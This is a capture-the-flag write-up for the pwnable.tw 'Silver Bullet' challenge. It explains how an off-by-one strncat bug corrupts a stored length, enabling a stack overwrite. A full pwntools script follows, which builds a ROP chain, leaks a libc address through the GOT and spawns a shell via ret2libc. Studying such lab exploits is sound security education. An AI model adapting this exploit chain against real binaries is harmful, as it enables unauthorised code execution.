## Silver Bullet

The vuln was that the string length was being stored right next to the actual string contents, and we could overflow 1 byte into it, and corrupt it. 

First, we send 47 byte bullet content, making stack like - `<A*47+null byte><47 as int_32>`

now, when we update, here is what happens - 
S
```c
read_input(&new_desc, 0x30 - *(uint32_t*)(desc + 0x30));
```
This basically reads 0x30-47 bytes, which is 1 byte only. Then it does - 
```c
strncat(desc, &new_desc, 0x30 - *(uint32_t*)(desc + 0x30));
size_t add_size = strlen(&new_desc);
```
What happens now is, strncat goes to orignal description, skips 47 bytes, writes 1 new byte, and then the final null byte is appended into 49th offset, which is the least signifcant byte of bullet size integer. This makes the size of bullet 0.

Now, it runs this - 
```c
int32_t updated_size = *(uint32_t*)(desc + 0x30) + add_size;
*(uint32_t*)(desc + 0x30) = updated_size;
```
`*(uint32_t*)(desc + 0x30)` evaluates to 0 now, and add_size is just 1. So, final size becomes 1!!.

Finally, if we call power_up function again, it will read 0x30-1 bytes. What strncat will do it, it will start at desc 0, and skip till it finds a null byte. Which, now is at 50th offset in size variable. So it will write 3 bytes into bullet_size integer
and next in stack is saved EBP and EIP of main, which we overwrite with ROP chain.

Now, as we have overwritten into size variable too, it becomes very big to defeat werewolf, and defeating it exits main, going into our ROP.

The ROP just calls puts() with GOT address of puts, and returns to main. And then we do ret2libc, by calling system() with address of /bin/sh string.


```py
from pwn import *

exe = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10103)
    return process([exe.path])

p = conn()

p.sendlineafter(b" :", b"1")
p.sendafter(b" :", b"A"*0x2f)
p.sendlineafter(b" :", b"2")
p.sendafter(b" :", b"AA")
p.sendlineafter(b" :", b"2")
p.sendlineafter(b" :", b"B"*7+p32(exe.plt["puts"])+p32(exe.symbols["main"])+p32(exe.got["puts"]))
p.sendline(b"3")
p.recvuntil(b"It still alive")
p.recvuntil(b" :")
p.sendline(b"3")

p.recvuntil(b"You win !!\n")
puts_leak = u32(p.recv(4))
log.info(f"puts_leak: {hex(puts_leak)}")
libc.address = puts_leak - libc.symbols["puts"]

p.sendlineafter(b" :", b"1")
p.sendafter(b" :", b"A"*0x2f)
p.sendlineafter(b" :", b"2")
p.sendafter(b" :", b"AA")
p.sendlineafter(b" :", b"2")
p.sendlineafter(b" :", b"B"*7+p32(libc.sym["system"])+p32(exe.symbols["main"])+p32(next(libc.search(b"/bin/sh"))))
p.sendline(b"3")
p.recvuntil(b"It still alive")
p.recvuntil(b" :")
p.sendline(b"3")
p.interactive()
```